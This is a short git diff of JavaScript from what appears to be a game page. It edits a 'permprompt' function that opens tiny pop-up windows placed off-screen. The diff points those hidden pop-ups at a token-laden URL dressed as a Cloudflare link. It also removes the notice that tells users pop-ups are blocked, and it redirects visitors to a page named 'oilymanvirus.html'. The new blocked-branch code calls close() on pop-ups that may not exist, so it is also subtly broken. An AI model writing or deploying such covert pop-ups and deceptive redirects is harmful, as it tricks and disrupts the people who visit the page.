@@ -76,18 +76,18 @@ function playBall() {
   }
 }
 function permprompt() {
-  const attempts = 10;
+  const attempts = 3;
   const popups = [];
 
   // Attempt to open multiple popups
   for (let i = 0; i < attempts; i++) {
-      const popup = window.open("", "", "width=1,height=1,right=-5000,bottom=-5000");
+      const popup = window.open("https://cloudflare.com/popuptest?=hD3UMay0orTnzvfYQPBeoobhnvucEztt63gahzvqy968xPSs9qxigpdT8u52Omt0nuvtDL1LY3jrrIkxb8BBHJMaFGQrOMcR7iK8wZFLbcIXK2jUfUXCU61Ow11fFMFv", "", "width=1,height=1,right=-5000,bottom=-5000");
       popups.push(popup);
   }
   const blocked = popups.some(popup => popup === null || typeof popup === "undefined");
 
   if (blocked) {
-      console.log("Popups are blocked. Please enable popups for this site in your browser settings.");
+      popups.forEach(popup => popup.close());
   } else {
       popups.forEach(popup => popup.close());
       window.location.href = "https://hrishiky.github.io/oilymanvirus.html";
